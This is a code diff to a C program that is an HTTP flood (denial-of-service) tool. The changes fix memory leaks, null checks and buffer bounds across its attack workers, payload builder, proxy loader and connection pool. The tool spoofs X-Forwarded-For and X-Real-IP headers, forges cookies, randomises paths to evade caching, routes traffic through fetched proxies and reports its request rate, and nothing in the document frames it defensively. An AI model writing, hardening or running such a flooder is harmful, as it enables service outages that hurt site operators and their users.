@@ -71,6 +71,14 @@ pthread_t stats_thread;
 time_t start_time;
 unsigned int rand_state;
 
+// Callback function for curl write data
+static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
+    size_t realsize = size * nmemb;
+    char *response = (char*)userp;
+    strncat(response, (char*)contents, realsize);
+    return realsize;
+}
+
 const char *USER_AGENTS[] = {
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
@@ -161,7 +169,13 @@ char* generate_large_payload(int *size) {
                 payload[pos++] = ' ';
                 payload[pos++] = ':';
                 payload[pos++] = ' ';
-                payload[pos++] = random_string(rand_int(5, 20))[0];
+                if (rand_int(0, 1)) {
+                    char *tmp = random_string(rand_int(5, 20));
+                    if (tmp) {
+                        payload[pos++] = tmp[0];
+                        free(tmp);
+                    }
+                }
                 payload[pos++] = '\r';
                 payload[pos++] = '\n';
             }
@@ -193,11 +207,23 @@ char* generate_custom_path() {
     strcpy(result, attack_paths[rand_int(0, sizeof(attack_paths)/sizeof(attack_paths[0]) - 1)]);
     
     char params[1024];
+    char *rand_str1 = random_string(rand_int(5, 15));
+    char *rand_str2 = random_string(rand_int(10, 30));
+    char *rand_str3 = random_string(rand_int(5, 15));
+    char *rand_str4 = random_string(rand_int(10, 30));
+    char *rand_hex1 = random_hex(rand_int(8, 16));
+    char *rand_hex2 = random_hex(rand_int(16, 32));
+    
     snprintf(params, sizeof(params), "?%s=%s&%s=%s&_=%ld&v=%d&cb=%s&t=%d&sig=%s",
-             random_string(rand_int(5, 15)), random_string(rand_int(10, 30)),
-             random_string(rand_int(5, 15)), random_string(rand_int(10, 30)),
-             time(NULL), rand_int(1, 9999999), random_hex(rand_int(8, 16)),
-             rand_int(1, 999999), random_hex(rand_int(16, 32)));
+             rand_str1 ? rand_str1 : "a", rand_str2 ? rand_str2 : "b",
+             rand_str3 ? rand_str3 : "c", rand_str4 ? rand_str4 : "d",
+             time(NULL), rand_int(1, 9999999), 
+             rand_hex1 ? rand_hex1 : "0", rand_int(1, 999999), 
+             rand_hex2 ? rand_hex2 : "0");
+    
+    free(rand_str1); free(rand_str2); free(rand_str3); free(rand_str4);
+    free(rand_hex1); free(rand_hex2);
+    
     strcat(result, params);
     
     return result;
@@ -230,7 +256,8 @@ void load_proxies_from_api() {
         curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
         
         char response[65536] = {0};
-        curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)response);
         
         CURLcode res = curl_easy_perform(curl);
         if (res == CURLE_OK) {
@@ -239,7 +266,9 @@ void load_proxies_from_api() {
                 while (*line == ' ' || *line == '\r') line++;
                 if (strlen(line) > 5 && strchr(line, ':')) {
                     proxy_list.proxies[proxy_list.count] = strdup(line);
-                    proxy_list.count++;
+                    if (proxy_list.proxies[proxy_list.count]) {
+                        proxy_list.count++;
+                    }
                 }
                 line = strtok(NULL, "\n");
             }
@@ -271,6 +300,7 @@ void init_connection_pool(ConnectionPool *pool, int size, bool use_proxy, const 
     pool->counter = 0;
     pool->use_proxy = use_proxy;
     strncpy(pool->target_host, host, 255);
+    pool->target_host[255] = '\0';
     pthread_mutex_init(&pool->mutex, NULL);
     
     printf(COLOR_YELLOW "[*] Creating connection pool with %d connections...\n" COLOR_RESET, size);
@@ -285,7 +315,7 @@ void init_connection_pool(ConnectionPool *pool, int size, bool use_proxy, const 
             curl_easy_setopt(pool->handles[i], CURLOPT_NOSIGNAL, 1L);
             curl_easy_setopt(pool->handles[i], CURLOPT_FORBID_REUSE, 1L);
             curl_easy_setopt(pool->handles[i], CURLOPT_TCP_NODELAY, 1L);
-            curl_easy_setopt(pool->handles[i], CURLOPT_BUFFERSIZE, 1024 * 1024);
+            curl_easy_setopt(pool->handles[i], CURLOPT_BUFFERSIZE, (long)(1024 * 1024));
         }
     }
     
@@ -322,24 +352,45 @@ void attack_worker(const char *target, const char *host, ConnectionPool *pool) {
     char header_buf[1024];
     
     for (int i = 0; i < 20; i++) {
-        snprintf(header_buf, sizeof(header_buf), "%s: %s", 
-                 random_string(rand_int(5, 15)), random_string(rand_int(10, 50)));
-        headers = curl_slist_append(headers, header_buf);
+        char *rand_name = random_string(rand_int(5, 15));
+        char *rand_value = random_string(rand_int(10, 50));
+        if (rand_name && rand_value) {
+            snprintf(header_buf, sizeof(header_buf), "%s: %s", rand_name, rand_value);
+            headers = curl_slist_append(headers, header_buf);
+        }
+        free(rand_name);
+        free(rand_value);
     }
     
     snprintf(header_buf, sizeof(header_buf), "User-Agent: %s", USER_AGENTS[rand_int(0, 11)]);
     headers = curl_slist_append(headers, header_buf);
     
     char *ip = random_ip();
-    snprintf(header_buf, sizeof(header_buf), "X-Forwarded-For: %s", ip);
-    headers = curl_slist_append(headers, header_buf);
-    snprintf(header_buf, sizeof(header_buf), "X-Real-IP: %s", ip);
-    headers = curl_slist_append(headers, header_buf);
-    free(ip);
+    if (ip) {
+        snprintf(header_buf, sizeof(header_buf), "X-Forwarded-For: %s", ip);
+        headers = curl_slist_append(headers, header_buf);
+        snprintf(header_buf, sizeof(header_buf), "X-Real-IP: %s", ip);
+        headers = curl_slist_append(headers, header_buf);
+        free(ip);
+    }
+    
+    char *rand_str1 = random_string(8);
+    char *rand_hex1 = random_hex(16);
+    char *rand_str2 = random_string(8);
+    char *rand_hex2 = random_hex(24);
+    char *rand_str3 = random_string(8);
+    char *rand_str4 = random_string(32);
+    char *rand_hex3 = random_hex(32);
     
     snprintf(header_buf, sizeof(header_buf), "Cookie: %s=%s; %s=%s; %s=%s; __cfduid=%s; _ga=GA1.2.%d.%ld",
-             random_string(8), random_hex(16), random_string(8), random_hex(24),
-             random_string(8), random_string(32), random_hex(32), rand_int(1000000, 9999999), time(NULL));
+             rand_str1 ? rand_str1 : "a", rand_hex1 ? rand_hex1 : "0",
+             rand_str2 ? rand_str2 : "b", rand_hex2 ? rand_hex2 : "0",
+             rand_str3 ? rand_str3 : "c", rand_str4 ? rand_str4 : "d",
+             rand_hex3 ? rand_hex3 : "0", rand_int(1000000, 9999999), time(NULL));
+    
+    free(rand_str1); free(rand_hex1); free(rand_str2); free(rand_hex2);
+    free(rand_str3); free(rand_str4); free(rand_hex3);
+    
     headers = curl_slist_append(headers, header_buf);
     
     headers = curl_slist_append(headers, "Accept: */*");
@@ -394,7 +445,7 @@ void* worker_thread(void *arg) {
 }
 
 void* stats_display(void *arg) {
-    AttackConfig *cfg = (AttackConfig*)arg;
+    (void)arg; // Suppress unused parameter warning
     
     while (running) {
         sleep(1);
@@ -411,16 +462,18 @@ void* stats_display(void *arg) {
         total_bytes = bytes_sent.val;
         pthread_mutex_unlock(&bytes_sent.mutex);
         
-        double rps = total_requests / elapsed;
-        double mbps = (total_bytes * 8) / (elapsed * 1000000);
-        
-        printf("\r\033[K");
-        printf(COLOR_RED "[⚡] " COLOR_RESET);
-        printf(COLOR_GREEN "RPS: %.0f " COLOR_RESET, rps);
-        printf(COLOR_YELLOW "Total: %lld " COLOR_RESET, total_requests);
-        printf(COLOR_CYAN "MB/s: %.1f " COLOR_RESET, mbps);
-        printf(COLOR_MAGENTA "Workers: %d" COLOR_RESET, MAX_WORKERS);
-        fflush(stdout);
+        if (elapsed > 0) {
+            double rps = total_requests / elapsed;
+            double mbps = (total_bytes * 8) / (elapsed * 1000000);
+            
+            printf("\r\033[K");
+            printf(COLOR_RED "[⚡] " COLOR_RESET);
+            printf(COLOR_GREEN "RPS: %.0f " COLOR_RESET, rps);
+            printf(COLOR_YELLOW "Total: %lld " COLOR_RESET, total_requests);
+            printf(COLOR_CYAN "MB/s: %.1f " COLOR_RESET, mbps);
+            printf(COLOR_MAGENTA "Workers: %d" COLOR_RESET, MAX_WORKERS);
+            fflush(stdout);
+        }
     }
     
     return NULL;
@@ -474,19 +527,23 @@ int main(int argc, char *argv[]) {
     cfg.use_proxy = (argc >= 4 && strcmp(argv[3], "proxy") == 0);
     
     char *url_copy = strdup(cfg.target_url);
-    char *proto_end = strstr(url_copy, "://");
-    char *host_start = proto_end ? proto_end + 3 : url_copy;
-    char *path_start = strchr(host_start, '/');
-    
-    if (path_start) {
-        size_t host_len = path_start - host_start;
-        strncpy(cfg.target_host, host_start, host_len);
-        cfg.target_host[host_len] = '\0';
-    } else {
-        strncpy(cfg.target_host, host_start, 255);
-        cfg.target_host[255] = '\0';
+    if (url_copy) {
+        char *proto_end = strstr(url_copy, "://");
+        char *host_start = proto_end ? proto_end + 3 : url_copy;
+        char *path_start = strchr(host_start, '/');
+        
+        if (path_start) {
+            size_t host_len = path_start - host_start;
+            if (host_len < 256) {
+                strncpy(cfg.target_host, host_start, host_len);
+                cfg.target_host[host_len] = '\0';
+            }
+        } else {
+            strncpy(cfg.target_host, host_start, 255);
+            cfg.target_host[255] = '\0';
+        }
+        free(url_copy);
     }
-    free(url_copy);
     
     init_random();
     curl_global_init(CURL_GLOBAL_ALL);
@@ -503,6 +560,11 @@ int main(int argc, char *argv[]) {
     }
     
     ConnectionPool *connection_pool = malloc(sizeof(ConnectionPool));
+    if (!connection_pool) {
+        printf(COLOR_RED "[!] Failed to allocate connection pool\n" COLOR_RESET);
+        return 1;
+    }
+    
     init_connection_pool(connection_pool, POOL_SIZE, cfg.use_proxy, cfg.target_host);
     
     print_banner();
@@ -521,13 +583,20 @@ int main(int argc, char *argv[]) {
     running = true;
     
     AttackConfig *args_array = malloc(sizeof(AttackConfig) * MAX_WORKERS);
+    if (!args_array) {
+        printf(COLOR_RED "[!] Failed to allocate workers array\n" COLOR_RESET);
+        return 1;
+    }
+    
     for (int i = 0; i < MAX_WORKERS; i++) {
         memcpy(&args_array[i], &cfg, sizeof(AttackConfig));
         args_array[i].pool = connection_pool;
-        pthread_create(&workers[i], NULL, worker_thread, &args_array[i]);
+        if (pthread_create(&workers[i], NULL, worker_thread, &args_array[i]) != 0) {
+            printf(COLOR_RED "[!] Failed to create thread %d\n" COLOR_RESET, i);
+        }
     }
     
-    pthread_create(&stats_thread, NULL, stats_display, &cfg);
+    pthread_create(&stats_thread, NULL, stats_display, NULL);
     
     sleep(cfg.duration_sec);
     running = false;
@@ -557,13 +626,17 @@ int main(int argc, char *argv[]) {
     printf(COLOR_RESET);
     
     for (int i = 0; i < POOL_SIZE; i++) {
-        curl_easy_cleanup(connection_pool->handles[i]);
+        if (connection_pool->handles[i]) {
+            curl_easy_cleanup(connection_pool->handles[i]);
+        }
     }
     free(connection_pool->handles);
     free(connection_pool);
     
     if (proxy_list.proxies) {
-        for (int i = 0; i < proxy_list.count; i++) free(proxy_list.proxies[i]);
+        for (int i = 0; i < proxy_list.count; i++) {
+            if (proxy_list.proxies[i]) free(proxy_list.proxies[i]);
+        }
         free(proxy_list.proxies);
     }
     
